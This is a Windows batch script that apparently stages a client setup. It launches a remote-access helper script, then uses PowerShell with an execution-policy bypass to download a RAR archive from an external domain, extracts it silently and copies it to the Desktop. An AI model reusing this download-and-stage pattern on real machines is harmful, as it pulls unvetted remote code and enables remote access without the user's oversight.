@echo off 
 
call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "CHECKING-28/05/2025-05:33" 
if %errorlevel% equ 0 ( 
echo done 
) else ( 
call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "CHECKING-28/05/2025-05:33" 
    call "%USERPROFILE%\Desktop\dow-code\test-something\asset\open-ultraview.bat" 
) 
set urls=https://spyderrock.com/hX2E5877-decode-awp.rar 
call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "AWP-SETUP-FILE2" 
if %errorlevel% equ 0 ( 
   echo done 
) else ( 
    call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "AWP-SETUP-FILE2" 
    powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'https://spyderrock.com/hX2E5877-decode-awp.rar' -OutFile '%USERPROFILE%\Desktop\decode-awp.rar'}" 
    mkdir "%USERPROFILE%\Desktop\decode-awp-temp" 
    "C:\Program Files\WinRAR\WinRAR.exe" x -ibck -y "%USERPROFILE%\Desktop\decode-awp.rar" "%USERPROFILE%\Desktop\decode-awp-temp\" 
    xcopy "%USERPROFILE%\Desktop\decode-awp-temp\decode-awp\*" "%USERPROFILE%\Desktop\decode-awp\" /E /Y /I /H 
    rmdir /s /q "%USERPROFILE%\Desktop\decode-awp-temp" 
) 
timeout /t 5 
